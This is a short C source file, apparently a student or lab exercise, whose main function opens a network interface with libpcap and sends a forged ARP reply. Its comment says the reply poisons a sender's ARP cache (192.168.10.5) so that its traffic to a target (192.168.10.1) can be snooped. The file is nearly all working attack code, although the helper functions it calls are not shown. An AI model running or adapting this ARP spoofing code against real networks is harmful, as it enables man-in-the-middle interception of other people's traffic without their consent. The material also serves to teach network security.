#include "init.h"
/*
 * Snipping packets from sender(192.168.10.5) to target(192.168.10.1)
 * The arp cache table of the sender is infected
*/
int main(int argc, char* argv[])
{
    if (argc != 4) {
           usage();
           return -1;
    }
    char* dev = argv[1];  // interface name, ex) eth0, wlan0
    u_char senderIP[4];
    u_char targetIP[4];

    /* convert ip addr string to hexa */
    inet_pton(AF_INET, argv[2], senderIP);
    inet_pton(AF_INET, argv[3], targetIP);

    /* pcap open */
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
       if (handle == NULL) {
           fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
           return -1;
    }

    /* get mac address specific interface name */
    u_char my_MACaddr[6];
    get_my_mac_addr(dev, my_MACaddr);

    /* send arp reply packet */
    send_arp(handle, dev, my_MACaddr, senderIP, targetIP);

    return 0;
}
